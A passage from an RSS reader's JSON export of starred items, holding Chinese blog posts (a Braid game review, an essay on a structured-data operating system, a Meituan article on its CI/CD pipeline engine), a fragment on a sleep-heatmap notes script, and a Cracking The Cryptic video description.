<span>8.5</span>)</span><br><span>    .<span>sort</span>(<span><span>p</span> =&gt;</span> p.<span>file</span>.<span>name</span>);</span><br><span></span><br><span><span>for</span>(<span>let</span> page <span>of</span> pages){ </span><br><span>    calendarData.<span>entries</span>.<span>push</span>({</span><br><span>        <span>date</span>: page.<span>file</span>.<span>name</span>,</span><br><span>        <span>intensity</span>: page.<span>Sleep</span>,</span><br><span>    })</span><br><span>}</span><br><span></span><br><span><span>renderHeatmapCalendar</span>(<span>this</span>.<span>container</span>, calendarData);</span><br></pre></td></tr></table></figure><h2><a href=\"https://diygod.me/#%E5%B1%80%E9%99%90\" title=\"局限\"></a>局限</h2><p>子弹笔记有一个很重要的任务清单模块，如上面子弹笔记截图所示，我之前会把一周的任务清单都提前写在笔记里，但现在日记都是当天自动生成，无法提前计划，所以我把任务清单都改用了滴答清单来管理，滴答清单当然也很好用，但是这样就少了与日记的联动，手动添加又会造成很多重复工作，就不是很爽</p><p>最后需要注意的是，即使有这样的生活管理系统也不意味着生活就会一切按照预期，就像上面举例的 5 月底睡眠失控事件，一旦放松失控仍会发生，笔记会告诉我生活正在失控，但如何回到正轨和追赶上 OKR 还是要靠自控力和坚持的定期总结、反思和改进</p>"
    },
    "origin": {
        "streamId": 11,
        "title": "DIYgod",
        "htmlUrl": "https://diygod.me/",
        "feedUrl": "https://diygod.me/atom.xml"
    }
},
{
    "id": "https://www.yinwang.org/blog-cn/2013/03/04/braid",
    "timestampUsec": "1657728209876305",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Braid - 一个发人深思的游戏",
    "author": ";王垠",
    "published": 1362355200,
    "updated": 1362355200,
    "alternate": [
        {
            "href": "https://www.yinwang.org/blog-cn/2013/03/04/braid",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<h2>Braid - 一个发人深思的游戏</h2>\n            <p><img src=\"http://www.yinwang.org/images/braid1.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p>\n\n<p>我已经很久很久没有打游戏了（如果不算 Angry Birds 之类用来打发时间的游戏的话）。我的最后一个真正意义上的游戏机是 PlayStation 1。在那上面，我真正欣赏的最后一个游戏，是 Metal Gear Solid (1)。</p>\n\n<p>我曾经是一个游戏迷，可是进入了计算机专业的学习之后，我就开始失去对游戏的兴趣，基本上每玩一个都让我失望一次，不管别人把它吹的多么“经典”。不知道为什么，别人玩得津津有味的游戏，我玩一会儿就把它里面的“公式”都看透了。我清楚地知道这游戏的设计者是怎么在“耍我”，在如何想方设法浪费我的时间。</p>\n\n<p>同样的，别人看得津津有味的小说和电影，我经常一看开头就能猜到它要怎么发展，知道这编剧是怎么在胡编滥造，索然无味。所以我基本上不去影院看最新的电影，宁愿在网上看一些几十年前的老电影。我貌似只喜欢那些能让我“猜不透”的东西。</p>\n\n<p>Braid，就是这样一个让我没猜得透的游戏。</p>\n\n<p>这是一个同事推荐的。本来已经对电玩完全失望的我，破例的从 App Store 买了来。玩过之后觉得真的很不错，有一种所谓的“mind blowing”的感觉。以至于我花了两整天时间，废寝忘食，把它给打通关了。</p>\n\n<p>Braid 的主体结构，和最古老的“超级玛丽”没什么两样。一个小人，可以跑，可以跳。一些小怪物，跑来跑去的。你可以跳起来踩它们。</p>\n\n<p>最终的目标，是收集到所有的拼图，然后把它们组合成图片。组合图片是很容易的事情。游戏的难度其实在于如何拿到这些拼图。它们有可能被挂在很高的地方，或者被门挡住。</p>\n\n<p>可是这有什么值得一提的呢？这游戏很不一样的地方是，它给你提供了几种绝无仅有的“超能力”，而且把它们与谜题结合得几乎天衣无缝。</p>\n\n<p>你有三种超能力：</p>\n\n<h3>逆转时间的能力</h3>\n\n<p>在任何时候按下 Shift 键，游戏的时间就会逆转，“undo”之前的所有动作。即使你死了，都是可以复活的。死去的小怪物们也会复活。可是就算这样，有些拼图还是很难拿到。</p>\n\n<p>值得一提的是，时间逆转的时候，画面是流畅无缺损的，连爆炸场面都会“收缩”。更令人赞叹的是，游戏的背景音乐也会同步逆转。如果在时间逆转的时候按“上”，“下”键，就可以调整时间“快退”和“快进”的速度。当然，此时的场景就像录像机在快退或者快进。</p>\n\n<h3>产生“多重现实”的能力</h3>\n\n<p><img src=\"http://www.yinwang.org/images/braid-shadow.jpeg\" alt=\"\" referrerpolicy=\"no-referrer\"></p>\n\n<p>在某些章节，你可以实现“多重现实”。做一个动作，然后按 Shift 键让时间逆转，当你停止逆转的时候，你的影子就会开始“redo”刚才的那段“历史”。而这个时候你可以做一些不同于以前的事情。这就好像有两个世界，一新一旧，从“历史的分叉点”开始，同步交汇。</p>\n\n<p>你必须掌握好时间才能跟影子合作，因为影子的行动速度是不受你的“现场控制”的，它只是按部就班的重演你 undo 掉的历史。</p>\n\n<h3>扭曲时间的指环</h3>\n\n<p><img src=\"http://www.yinwang.org/images/braid-ring.jpeg\" alt=\"\" referrerpolicy=\"no-referrer\"></p>\n\n<p>在某些章节，你会有机会使用一个魔法指环。把这个指环放在地上之后，它会在附近的球状空间中形成时间的“扭曲”。这有点像黑洞的原理。越是靠近指环的位置，时间流动越慢。而当你远离指环，时间就逐渐恢复正常。指环的巧妙使用，是解决这些章节谜题的关键。</p>\n\n<p>同样的，音乐与指环的特异功能是完美配合的。当你靠近指环的时候，背景音乐就会出现相应程度的扭曲。有点像录音机卡带的感觉  :)</p>\n\n<p>在解决了所有的谜题之后，我回味了一下，自己为什么欣赏 Braid。这也许是因为它符合一个优秀的，非低级趣味的游戏设计：屈指可数的简单规则，却可以组合起来，制造出许许多多的变化。</p>\n\n<p>你只有3种超能力，但是如何利用和“组合”这些超能力，却形成了解决谜题的关键。有些题目很有点难度，以至于你会希望有第4种超能力出现，或者希望捡到别的什么“法宝”。可是它们是不存在的。你必须使用那仅有的3种能力，加上巧妙的思索，细心的观察，才能达到目的。在解决了一个很难的谜题之后，你往往会一拍脑袋：哇，我怎么一开头没想到！</p>"
    },
    "origin": {
        "streamId": 12,
        "title": "王垠",
        "htmlUrl": "https://www.yinwang.org/",
        "feedUrl": "https://rsshub.app/blogs/wangyin"
    }
},
{
    "id": "https://www.yinwang.org/blog-cn/2013/04/14/os-design",
    "timestampUsec": "1657728209876323",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "一种新的操作系统设计",
    "author": ";王垠",
    "published": 1365897600,
    "updated": 1365897600,
    "alternate": [
        {
            "href": "https://www.yinwang.org/blog-cn/2013/04/14/os-design",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<h2>一种新的操作系统设计</h2>\n            <p>我一直在试图利用程序语言的设计原理，设计一种超越“Unix 哲学”的操作系统。这里是我的设想：</p>\n\n<ul>\n  <li>\n    <p>这种系统里面的程序间通信不使用无结构的字符串，而是使用带有类型和结构的数据。在这样的系统里面，Unix 和其它类似操作系统（比如 Windows）里的所谓“应用程序”的概念基本上完全消失。系统由一个个很小的“函数”组成，每个函数都可以调用另外一个函数，通过参数传递数据。每个函数都可以手动或者自动并发执行。用现在的系统术语打个比方，这就像是所有代码都是“库”代码，而不存在独立的“可执行文件”。</p>\n  </li>\n  <li>\n    <p>由于参数是数据结构而不是字符串，这避免了程序间通信繁琐的编码和解码过程。使得“进程间通信”变得轻而易举。任何函数都可以调用另一个函数来处理特定类型的数据，这使得像 “OLE 嵌入”这样的机制变得极其简单。</p>\n  </li>\n  <li>\n    <p>所有函数由同一种先进的高级程序语言写成，所以函数间的调用完全不需要“翻译”。不存在 SQL injection 之类由于把程序当成字符串而产生的错误。</p>\n  </li>\n  <li>\n    <p>由于这种语言不允许应用程序使用“指针运算”，应用程序不可能产生 segfault 一类的错误。为了防止不良用户手动在机器码里面加入指针运算，系统的执行的代码不是完全的机器代码，而必须通过进一步的验证和转换之后才会被硬件执行。这有点像 JVM，但它直接运行在硬件之上，所以必须有一些 JVM 没有的功能，比如把内存里的数据结构自动换出到硬盘上，需要的时候再换进内存。</p>\n  </li>\n  <li>\n    <p>由于没有指针运算，系统可以直接使用“实地址”模式进行内存管理，从而不再需要现代处理器提供的内存映射机制以及 TLB。内存的管理粒度是数据结构，而不是页面。这使得内存访问和管理效率大幅提高，而且简化了处理器的设计。据 Kent Dybvig 的经验，这样的系统的内存使用效率要比 Unix 类的系统高一个数量级。</p>\n  </li>\n  <li>\n    <p>系统使用与应用程序相同的高级语言写成，至于“系统调用”，不过是调用另外一个函数。由于只有这些“系统驱动函数”才有对设备的“引用”，又因为系统没有指针运算，所以用户函数不可能绕过系统函数而非法访问硬件。</p>\n  </li>\n  <li>\n    <p>系统没有 Unix 式的“命令行”，它的“shell”其实就是这种高级语言的 REPL。用户可以在终端用可视化的结构编辑方式输入各种函数调用，从而启动进程的运行。所以你不需要像 Unix 一样另外设计一种毛病语言来“粘接”应用程序。</p>\n  </li>\n  <li>\n    <p>所有的数据都作为“结构”，保存在一个分布式的数据共享空间。同样的那个系统语言可以被轻松地发送到远程机器，调用远程机器上的库代码，执行任意复杂的查询索引等动作，取回结果。这种方式可以高效的完成数据库的功能，然而却比数据库简单很多。所谓的“查询语言”（比如 SQL，Datalog，Gremlin，Cypher）其实是多此一举，它们远远不如普通的程序语言强大。说是可以让用户“不需要编程，只提出问题”，然而它们所谓的“优化”是非常局限甚至不可能实现的，带来的麻烦远比直接编程还要多。逻辑式编程语言（比如 Prolog）其实跟 SQL 是一样的问题，一旦遇到复杂点的查询就效率低下。所以系统不使用关系式数据库，不需要 SQL，不需要 NoSQL，不需要 Datalog。</p>\n  </li>\n  <li>\n    <p>由于数据全都是结构化的，所以没有普通操作系统的无结构“文件系统”。数据结构可能通过路径来访问，然而路径不是一个字符串或者字符串模式。系统不使用正则表达式，而是一种类似 NFA 的数据结构，对它们的拆分和组合操作不会出现像字符串那样的问题，比如把 /a/b/ 和 /c/d 串接在一起就变成错误的 /a/b//c/d。</p>\n  </li>\n  <li>\n    <p>所有的数据在合适的时候被自动同步到磁盘，并且进行容错处理，所以即使在机器掉电的情况，绝大部分的数据和进程能够在电源恢复后继续运行。</p>\n  </li>\n  <li>\n    <p>程序员和用户几乎完全不需要知道“数据库”或者“文件系统”的存在。程序假设自己拥有无穷大的空间，可以任意的构造数据。根据硬件的能力，一些手动的存盘操作也可能是有必要的。</p>\n  </li>\n  <li>\n    <p>为了减少数据的移动，系统或者用户可以根据数据的位置，选择： 1）迁移数据，或者 2）迁移处理数据的“进程”。程序员不需要使用 MapReduce，Hadoop 等就能进行大规模并行计算，然而表达能力却比它们强大很多，因为它们全都使用同一种程序语言写成。</p>\n  </li>\n</ul>\n\n<p>我曾经以为我是第一个想到这个做法的人。可是调查之后发现，很多人早就已经做出了类似的系统。Lisp Machine 似乎是其中最接近的一个。<a href=\"http://www.yinwang.org/blog-cn/2013/03/07/oberon\">Oberon</a> 是另外一个。IBM System/38 是类似系统里面最老的一个。最近一些年出现的还有微软的 <a href=\"http://research.microsoft.com/en-us/projects/Singularity\">Singularity</a>，另外还有人试图把 JVM 和 Erlang VM 直接放到硬件上执行。</p>\n\n<p>所以这篇文章的标题其实是错的，这不是一种“新的操作系统设计”。它看起来是新的，只不过因为我们现在用的操作系统忘记了它们本该是什么样子。我也不该说它“超越了 Unix 哲学”，而应该说，所谓的 Unix 哲学其实是历史的倒退。</p>"
    },
    "origin": {
        "streamId": 12,
        "title": "王垠",
        "htmlUrl": "https://www.yinwang.org/",
        "feedUrl": "https://rsshub.app/blogs/wangyin"
    }
},
{
    "id": "yt:video:DVR6FK_pklQ",
    "timestampUsec": "1658002395967950",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Maximum Difficulty = THIS!",
    "author": ";Cracking The Cryptic",
    "published": 1657999800,
    "updated": 1657999800,
    "alternate": [
        {
            "href": "https://www.youtube.com/watch?v=DVR6FK_pklQ",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div class=\"enclosure\"><p class=\"enclosure-title\">Maximum Difficulty = THIS!</p><p><img class=\"enclosure-thumbnail\" src=\"https://i1.ytimg.com/vi/DVR6FK_pklQ/hqdefault.jpg\" alt=\"\" /></p><p class=\"enclosure-content\"><a download=\"\" href=\"https://www.youtube.com/v/DVR6FK_pklQ?version=3\">💾</a></p><p class=\"enclosure-description\">*** STOP PRESS ***\nOur new app is OUT on App Store AND Android!!  We've completely revamped the interface.  Now you download the basic app free and you can choose to download additional content.  So there's a FREE pack of puzzles by Prasanna Seshadri and a paid pack: DOMINO SUDOKU!!! Prasanna's free pack includes one puzzle for each variant of our existing apps (so there's a killer sudoku, a miracle sudoku, a thermo sudoku, etc). Domino Sudoku is a pack of 100 handmade puzzles (40 on launch, 5 added each month for a year) by some of the best constructors in the World: Phistomefel, clover, jovi_al, Christoph Seeliger, Qodec, Sam Cappleman-Lynes and Richard Stolk have all contributed sudokus!! \n\nhttps://apps.apple.com/us/app/cracking-the-cryptic/id1629992934\n\nhttps://play.google.com/store/apps/details?id=com.StudioGoya.CrackingTheCryptic\n\nThe app is coming very soon to Steam as well.\n\n*** TODAY'S PUZZLE ***\nThis puzzle is sitting pretty on Logic Masters Germany with a 100% approval rating from the few hardy souls who have managed to solve it.  It also carries the feared 5/5 difficulty rating.  It's called Vault Construction and it's the work of the_cogito.  This is an extraordinary (and extraordinarily difficult) sudoku.  Good luck!\n\nPlay the puzzle at the link below: \nhttps://tinyurl.com/2tcfan5c\n\nWe hear some viewers have trouble with tinyurl links at the moment so here is a normal link too:\nhttps://app.crackingthecryptic.com/sudoku/d8Qpr2r36t\n\nRules: \nPlace the digits 1 to 9 once each into every row, column and region. Regions need to be discovered and consist of 9 orthogonally connected cells. Pink cages are &quot;vaults&quot;. Digits MAY repeat within a vault. Any digits within a vault may not appear in any cells orthogonally adjacent to that vault. The largest digit in any given vault is equal to the number of distinct regions passing through that vault.\n\n\nThe puzzle pack to celebrate 7000 puzzles on the Fan Discord can be played here:\n\nhttps://tinyurl.com/7WondersPuzzles\n\n\n*** PATREON REWARDS JUST OUT ***\n\nWe've just released a brand new Sudoku Hunt from Joseph Nehme themed around Equal Sum Lines!  With 13 puzzles in all, this is just a wonderful collection of puzzles.  Do have a go if you can.\n\nJust $2/month here:\n\nhttps://www.patreon.com/crackingthecryptic\n\n▶ Contact Us ◀\n\nTwitter:  @Cracking The Cryptic  \nemail: crackingthecryptic@gmail.com\n\nOur PO Box address:\n\nSimon Anthony &amp; Mark Goodliffe \nBox 102\n56 Gloucester Road \nLondon\nSW7 4UB\n\n(Please note to use our real names rather than 'Cracking The Cryptic'.)\n\n▶ SUDOKU PAD - Our New App  ◀\n\nIt's OUT on Windows (released yesterday!) via Steam here:\nhttps://store.steampowered.com/app/1706870/Svens_SudokuPad/\n\nYou can now input your own classic sudoku puzzles into our software using our new App!  The app also comes with 12 handmade puzzles from us and we're also releasing occasional bonus puzzles too.  Already available on IOS and Android.\n\n**************************************************************\n\n▶ OUR ARROW SUDOKU APP IS OUT ON ALL PLATFORMS!\nHere are the links:\nSteam:\nhttps://store.steampowered.com/app/1613680/Arrow_Sudoku/\nApp Store:\nhttps://apps.apple.com/us/app/arrow-sudoku/id1568407537\nGoogle Play:\nhttps://play.google.com/store/apps/details?id=com.StudioGoya.ArrowSudoku\n\n▶ OUR KILLER SUDOKU APP IS OUT ON ALL PLATFORMS◀\nhttps://apps.apple.com/us/app/killer-sudoku-ctc/id1544165118\n\nhttps://store.steampowered.com/app/1471910/Killer_Sudoku/\nhttps://play.google.com/store/apps/details?id=com.StudioGoya.KillerSudoku&amp;hl=en_US&amp;gl=US\n\n▶  SIMON REACTION BOARD (!) ◀\nWith thanks to Andrea for creating this :)\nhttps://simonreacts.avris.it/\n\n▶ CTC FAN DISCORD SERVER◀\nhttps://discord.gg/BbN89j5\n\nNEW:  Guide To Our Discord Server:\nhttps://tinyurl.com/CTCDiscordGuide\n\n▶ OUR BACK CATALOGUE – ALL CATEGORISED WITH LINKS!◀\nhttps://tinyurl.com/CTCCatalogue\n\n▶ *NEW* CRACKING THE CRYPTIC MERCHANDISE◀ \nhttps://teespring.com/en-GB/stores/cracking-the-cryptic\n\n▶TRY OUR CLASSIC SUDOKU APP◀\nAppStore: https://apps.apple.com/us/app/classic-sudoku/id1488838275?ls=1\nSteam: https://store.steampowered.com/app/1188330/Classic_Sudoku/\nAndroid: https://play.google.com/store/apps/details?id=com.StudioGoya.ClassicSudoku&amp;hl=en_US\n\n▶TRY OUR SANDWICH SUDOKU APP◀\nAppStore: https://apps.apple.com/us/app/sandwich-sudoku/id1476116705?ls=1 \nSteam: https://store.steampowered.com/app/1117310/Sandwich_Sudoku/  \nAndroid: https://play.google.com/store/apps/details?id=com.StudioGoya.SandwichSudoku\n\n▶SEND US PUZZLES TO SOLVE/CONTACT US◀\ncrackingthecryptic@gmail.com\n\n▶FOLLOW US◀\nTwitter: #crypticcracking \n@crypticcracking\nInstagram (for how to solve daily clues from The Times): https://www.instagram.com/crackingthecryptic/?hl=en\n\n▶Logo Design◀\nMelvyn Mainini</p></div>\n"
    },
    "origin": {
        "streamId": 14,
        "title": "Cracking The Cryptic",
        "htmlUrl": "https://www.youtube.com/channel/UCC-UOdK8-mIjxBQm_ot1T-Q",
        "feedUrl": "https://www.youtube.com/feeds/videos.xml?channel_id=UCC-UOdK8-mIjxBQm_ot1T-Q"
    }
},
{
    "id": "https://tech.meituan.com/2022/07/14/cicd-pipeline.html",
    "timestampUsec": "1658115798696118",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "工程效能CI/CD之流水线引擎的建设实践",
    "author": ";美团技术团队",
    "published": 1657756800,
    "updated": 1657756800,
    "alternate": [
        {
            "href": "https://tech.meituan.com/2022/07/14/cicd-pipeline.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<h2>1. 背景</h2><p>持续交付这个概念最早在2006年敏捷大会上被提出，经过多年的发展，目前已成为很多技术团队提升研发效能的必经之路。通过建设部署流水线，打通从代码开发到功能交付的整个环节，以自动化的方式完成构建、测试、集成、发布等一系列行为，最终实现向用户持续高效地交付价值。</p><p>流水线引擎作为支撑部署流水线的底座，它的好坏直接影响着部署流水线建设的水平。业界通常的做法是通过Jenkins、GitlabCI等开源工具（或公有云产品）进行搭建，这是一条能帮助业务快速落地持续交付的道路，美团早期也是采用搭建Jenkins的方式来快速支撑业务。</p><p>但随着越来越多业务开始做持续交付的建设，这种“短平快”方式的弊端逐渐显现。比如，工具建设没有统一的标准，各业务都需要去了解整个工具链的细节，建设成本高、水平参差不齐，很少有业务能搭建完整的部署流水线。同时，业务每天的构建量都在快速增长，逐渐超过Jenkins等开源工具所能承受的极限，在交付高峰期任务严重排队、服务不可用现象频出，严重影响着业务交付的顺畅度。</p><p>美团在流水线引擎的建设层面大概经历了几个阶段。在2019年以前，主要围绕Jenkins进行优化，2019年开始正式立项打造自研的流水线引擎，大致的历程如下：</p><ul><li><strong>第一阶段（2014-2015）</strong>：搭建Jenkins统一集群，解决业务接入的通用问题（如单点登录、代码仓库集成、消息通知、执行机的动态扩缩等），降低业务的建设成本。</li><li><strong>第二阶段（2016-2018）</strong>：拆分多个Jenkins集群，解决业务增长导致单集群性能瓶颈。最多时有十几个集群，这些集群通常是按业务线维度划分，并由业务自行建设。但随着时间的推移，集群的拆分管理难度越来越大，Jenkins安全隐患频出，对平台方造成了很大的运维负担。</li><li><strong>第三阶段（2019-至今）</strong>：为了彻底解决引擎单机瓶颈和工具重复建设问题，我们开始自研分布式流水线引擎（美团内部项目名称为Pipeline），并逐步收敛各业务依赖的底层基建。</li></ul><p>经过3年左右的建设打磨，流水线引擎完成了服务端的基建统一，涵盖<strong>到店、到家、大众点评、美团优选、美团平台、自动配送车、基础研发平台</strong>等几乎所有的业务，支持Java、C++、NodeJS、Golang等多种语言。在性能和稳定性方面，引擎每日支撑<strong>近十万次</strong>的流水线执行量（作业调度峰值每小时达上万次），系统成功率保持在<strong>99.99%</strong>以上（排除业务代码自身原因和第三方工具的问题）。</p><p>下面我们主要介绍下我们在自研引擎建设上遇到的挑战以及对应的解决方案。</p><h2>2. 问题及思路</h2><h3>2.1 业务介绍</h3><p><strong>1）什么是流水线</strong></p><p>我们可以把流水线的执行看作是对代码一步步加工，最终交付到线上的过程。根据业务定义的顺序关系，依次执行相应的加工或质量校验行为（如构建、代码扫描、接口测试、部署工具等），整个执行过程类似一个有向无环图。</p><p><img src=\"https://p0.meituan.net/travelcube/41d94d7d01a6a09ee2a41b6173d076d633107.png\" alt=\"图1 流水线概念\" referrerpolicy=\"no-referrer\"></p><p><strong>2）基本概念</strong></p><ul><li><strong>组件</strong>：出于代码复用和业务共享的考虑，我们将某一工具的操作行为封装成一个组件，表示对于一项具体的加工或校验行为。通过组件方式，业务可以便捷地使用已集成的质量工具（如静态代码扫描、安全漏洞分析等），减少在同一工具上的重复开发成本；对于不满足需求的场景，业务可以自定义一个新的组件。</li><li><strong>组件作业</strong>：表示组件的一次运行实例。</li><li><strong>资源</strong>：为组件作业分配的一个可执行环境。</li><li><strong>流水线编排</strong>：表示流水线中不同组件执行的先后顺序。</li><li><strong>引擎</strong>：负责调度所有的组件作业，为其分配相应的执行资源，保证流水线执行按预期完成。</li></ul><h3>2.2 主要挑战</h3><p><strong>1）调度效率瓶颈</strong></p><p>对调度时间相对敏感，流水线大部分是短时作业（作业持续数十秒到分钟不等），如果调度时间过长，业务能明显感知到流水线执行变慢了。我们需要保证作业调度时间在一个可控的范围内，避免出现调度瓶颈。</p><ul><li>从业务场景考虑，调度逻辑存在一定的业务复杂性（如组件串并行判断、优先级抢占、降级跳过、复用上一次结果等），不仅仅是作业与资源的匹配计算，作业调度耗时存在一定的业务开销。</li><li>引擎支撑公司每天近十万次的执行量，峰值量情况下，并发调度的作业量大，常见的开源工具（Jenkins/GitLab CI/Tekton等）都是采用单体调度模式，作业是串行调度的，容易出现调度瓶颈。</li></ul><p><strong>2）资源分配问题</strong></p><p>对于作业系统来说，作业数通常都是大于资源数的（真实部署情况，资源不是无限的），作业积压是系统设计时必须考虑的问题。如何在有限的资源下，尽可能提高作业的吞吐能力，同时降低在资源不足情况时造成对核心业务场景的影响。</p><ul><li>如果只依靠动态扩容，容易出现资源不足时无法扩容、作业排队等待的情况。特别是对于依赖流水线做研发卡控的业务，这会直接阻塞业务的上线流程。</li><li>出于执行耗时的考虑，大部分资源采用预部署的方式，缩短资源申请和应用启动的准备时间。而对于预部署的资源，如何进行有效划分，既保证每类资源都有一定配额，同时也避免出现部分资源利用率过低，影响作业整体的吞吐能力。</li><li>不是所有工具的执行资源都由引擎管理（如发布系统，部署任务的资源管理是单独的），在作业的资源分配上，还需要考虑不同的资源管理方式。</li></ul><p><strong>3）工具差异化问题</strong></p><p>公司内不同业务的差异化大，涉及的质效类工具众多，如何设计一个合适的插件化架构，满足不同工具的接入需求。</p><ul><li>不同工具实现形式差异化大，有些工具有独立的平台，可以通过接口方式进行集成，有些仅仅是一段代码片段，还需要提供相应的运行环境。面对不同的接入形态，引擎如何屏蔽不同工具带来的差异，使业务在编排流水线时不用关注到工具的实现细节。</li><li>随着业务场景的不断丰富，组件执行还会涉及人工交互（审批场景）、支持重试、异步处理、故障恢复等能力，这些能力的扩展如何尽可能减少对系统的冲击，降低实现的复杂度。</li></ul><h3>2.3 解决思路</h3><p><strong>1）拆分调度决策与资源分配，解决调度效率瓶颈</strong></p><p>从上述分析，一个作业的实际调度耗时 = 单个作业的调度耗时 * 待调度的作业数。因为单个作业的调度耗时会受具体的业务逻辑影响，不确定性大，优化空间有限。而串行调度问题相对明确，在作业调度时间和数量不可控的情况下，是一个合适的优化方向。</p><p>关于串行调度，业界常见的做法是按照业务线维度拆分多个集群，分摊总的调度压力。但这种方式存在的问题是资源分配不具备灵活性，很容易出现资源的分配不均，在整体资源不足时，无法从全局上考虑高优作业的资源分配。并且，多集群管理（新增集群/拆分现有集群）也是不小的运维负担。</p><p>进一步分析，串行调度主要是为了避免资源竞争问题，获得相对最优的资源。这对于流水线场景（作业量大于资源量且都是短时作业），资源最优解不是强诉求。并且，资源量的并发度相对作业量更可控，根据作业执行快慢不同，我们通过主动拉取作业的方式，控制拉取的数量和频率，从而有效降低了资源竞争的情况。</p><p>最终，我们在设计上采取了调度决策与资源分配分离的模式：</p><ul><li><strong>调度决策</strong>：负责计算出可以调度的作业，提交决策，等待合适的资源来执行。该模块具体水平扩展，分担调度决策的压力。</li><li><strong>资源分配</strong>：负责维护作业与资源的关系，通过主动拉取作业的方式，资源可以向任意的实例拉取作业，取消了原先串行分配资源的单点限制。</li></ul><p>在这种模式下，作业调度、资源分配都具备水平扩展能力，拥有更高的性能和系统可用性。也利于作业调度的逻辑能够独立演进，便于开发、测试以及灰度上线。</p><p><strong>2）引入资源池管理模式，实现资源的灵活分配</strong></p><p>考虑到不是所有资源都由引擎管理，我们引入资源池的概念来屏蔽不同资源方式的差异，每个资源池代表一类资源的集合，不同资源池的资源管理方式可以是多样化的。通过该方式，我们将资源分配的问题简化为作业与资源池的匹配问题，根据作业的实际情况，合理设置不同的资源池大小，并配合监控手段对资源池进行动态调整。</p><p>在具体措施上，我们选择“标签”的方式建立作业与资源池的匹配关系，通过从作业与资源两个维度来满足上述条件。</p><ul><li>在作业端，作业基于标签属性拆分到不同的作业队列，并引入优先级概念，保证每个队列中作业按优先级高低被拉取到，避免在积压时，高优作业排在后面无法被及时处理，阻塞业务研发流程。</li><li>在资源端，结合资源的实际场景，提供三种不同的资源池管理方式，以解决不同资源类型的配额和利用率问题。<ul><li>预置的公共资源，这部分资源会提前在资源池上扩容出来，主要应对业务高频使用的且对时间敏感的组件作业。在资源配额和利用率上，根据资源池的历史情况和实时监控，动态调整不同资源池的大小。</li><li>按需使用的资源，主要针对公共资源环境不满足的情况，业务需要自定义资源环境，考虑到这部分作业的体量不大，直接采用实时扩容的方式，相比预置资源的方式，可以获得更好的资源利用率。</li><li>外部平台的资源，这些资源的管理平台方比我们更有经验，平台方通过控制向引擎拉取作业的频率和数量，自行管理作业的吞吐情况。</li></ul></li></ul><p><strong>3）引入组件的分层设计，满足工具差异化需求</strong></p><p>为了保持工具接入的自由度，引擎提供了作业维度最基本的操作接口（拉取作业、查询作业状态、上报作业结果），不同工具可以根据作业接口形式实现定制化的组件开发。</p><p>组件开发主要涉及①实现业务逻辑和②确定交付方式两部分工作，而与引擎的系统交互相对是标准的。我们根据组件执行过程进行分层设计，拆分出业务逻辑、系统交互与执行资源三层。在向引擎屏蔽工具实现细节的同时，可以更好地满足多样化的接入场景。</p><ul><li>系统交互层，该层相对组件开发者是透明的，根据引擎提供的接口制定统一的流程交互标准，以向引擎屏蔽不同组件的实现差异。</li><li>执行资源层，主要解决工具运行方式的差异化，通过支持多种组件交付形式（如镜像、插件安装、独立服务）满足工具与引擎的不同集成方式。</li><li>业务逻辑层，针对业务不同的开发场景，采用多种适配器的选择，来满足业务不同的开发诉求。</li></ul><h2>3. 整体架构</h2><p><img src=\"https://p0.meituan.net/travelcube/758865a4f50abbdb742ad9119aea61a8243063.png\" alt=\"图2 流水线架构\" referrerpolicy=\"no-referrer\"></p><ul><li><strong>触发器</strong>：作为流水线的触发入口，管理多种触发源及触发规则（Pull Request、Git Push、API 触发、定时触发等）。</li><li><strong>任务中心</strong>：管理流水线构建过程中的运行实例，提供流水线运行、中止、重试、组件作业结果上报等操作。</li><li><strong>决策者</strong>：对所有等待调度的作业进行决策，并将决策结果同步给任务中心，由任务中心进行作业状态的变更。</li><li><strong>Worker</strong>：负责向任务中心拉取可执行的作业，并为作业分配具体的执行资源。</li><li><strong>组件SDK</strong>：作为执行组件业务逻辑的壳，负责真正调起组件，完成组件初始化与状态同步的系统交互。</li></ul><h2>4. 核心设计点</h2><h3>4.1 作业调度设计</h3><p><strong>1）调度过程</strong></p><p>下面，我们以一个简单的流水线调度示例（源码检出 - [并行：代码扫描，构建] - 部署），来介绍调度设计中各模块的协作过程。</p><p><img src=\"https://p0.meituan.net/travelcube/9fb69543903cef3bc06d309f664884bf168278.png\" alt=\"图3 调度过程\" referrerpolicy=\"no-referrer\"></p><p>大致逻辑如下：</p><ol><li>当触发流水线构建后，系统会在<strong>任务中心</strong>创建该编排所要执行的所有组件作业。并且将作业状态的变化以事件方式通知决策者进行决策。</li><li><strong>决策者</strong>接收决策事件，根据决策算法计算出可被调度的作业，向<strong>任务中心</strong>提交作业的状态变更请求。</li><li><strong>任务中心</strong>接收决策请求，完成作业状态变更（作业状态变更为已决策），同时加入相应的等待队列。</li><li><strong>Worker</strong> 通过长轮询方式拉取到和自己匹配的等待队列的作业，开始执行作业，执行完成后将结果上报给<strong>任务中心</strong>。</li><li><strong>任务中心</strong>根据Worker上报的作业执行结果变更作业状态，同时向<strong>决策者</strong>发起下一轮决策。</li><li>以此反复，直至流水线下所有作业都已执行完成或出现作业失败的情况，对流水线进行最终决策，结束本次执行。</li></ol><p>整个过程中，任务中心作为一个分布式存储服务，统一维护流水线和作业的状态信息，以API方式与其他模块进行交互。而决策者和Worker通过监听作业状态的变化执行相应的逻辑。</p><p><strong>2）作业状态流转</strong></p><p>下面是一个作业完整的状态机，我们通过作业决策、拉取、ACK以及结果上报一系列事件，最终完成作业从初始状态向完结状态的流转过程。</p><blockquote><p>状态机在接收某种状态转移的事件（Event）后，将当前状态转移至下一个状态（Transition），并执行相应的转移动作（Action）。</p></blockquote><p><img src=\"https://p0.meituan.net/travelcube/cab933e32a3857a55eaf8874f0453cc3229665.png\" alt=\"图4 状态机\" 